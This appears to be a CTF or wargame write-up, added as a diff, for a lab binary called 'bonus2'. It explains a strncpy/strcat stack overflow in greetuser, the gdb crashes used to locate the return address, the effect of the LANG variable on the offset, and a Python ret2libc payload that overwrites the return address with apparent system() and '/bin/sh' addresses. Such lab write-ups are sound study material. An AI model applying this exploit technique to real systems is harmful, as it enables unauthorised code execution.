@@ -1,0 +1,78 @@
+## program preview  
+
+the program take two agrument as aparameter if it 3 will jump to another code if not will return 0 and exit the program.
+
+```bash
+./bonus2 one two
+
+output:
+Hello one
+```
+and when i make as a argument payload to large it give me this 
+```bash
+(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+```
+
+that's mean we can control the return address and we can use this to jump to another code in the program like system function.
+
+
+and there is a function called inside the program called greetuser that take a string as a parameter and print it to the screen and return 0.
+
+```assembly
+0x0804862b <+258>:   call   0x8048484 <greetuser>
+```
+
+and before there is probelm we call the function strncpy that dosen't
+put null terminator in the last byte 
+after it in the function greetuser we have strcat that cancatenate the string to the buffer and it will cause a buffer overflow and we can use this to control the return address.
+
+another test to found the return address 
+
+```bash
+run ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz
+Starting program: /home/user/bonus2/bonus2 ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz
+Hyvää päivää ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdABCDEFGHIJKLMNOPQRSTUVWXYZ012345
+
+Program received signal SIGSEGV, Segmentation fault.
+0x56555453 in ?? ()
+```
+0xb7e6b060
+0xb7f8cc58:
+
+and we have something interesting here the buffer we give is depand on what he concatenate with it cause there is a if condition in the function greetuser it take the getenv("LANG") and check if it equal to "nl" or "en" and if it equal to "nl" it will concatenate "Hyvää päivää " to the buffer and if it equal to "en" it will concatenate "Hello " to the buffer and if not it will concatenate nothing to the buffer.
+
+
+when i convert:
+```text
+0x56555453 to ascii it will give me VUTS and this is the return
+```
+
+now the payload need to be on the adress of the return is 
+```bash
+ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMN [saved ebp] [return address] 
+```
+will be like this:
+
+```bash
+./bonus2 $(python -c 'print "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"') $(python -c 'print "ABCDEFGHIJKLMNBBBB" + "\x60\xb0\xe6\xb7" + "AAAA\x58\xcc\xf8\xb7"')
+```
+
+the pyload depand on the enviroment variable if it equal to "nl" or "en"
+i work with fi that's make the concatenation with `Hyv\xc3\xa4\xc3\xa4 p\xc3\xa4iv\xc3\xa4\xc3\xa4 ` 16 bytes
+
+
+
+
+
+
+
+
+
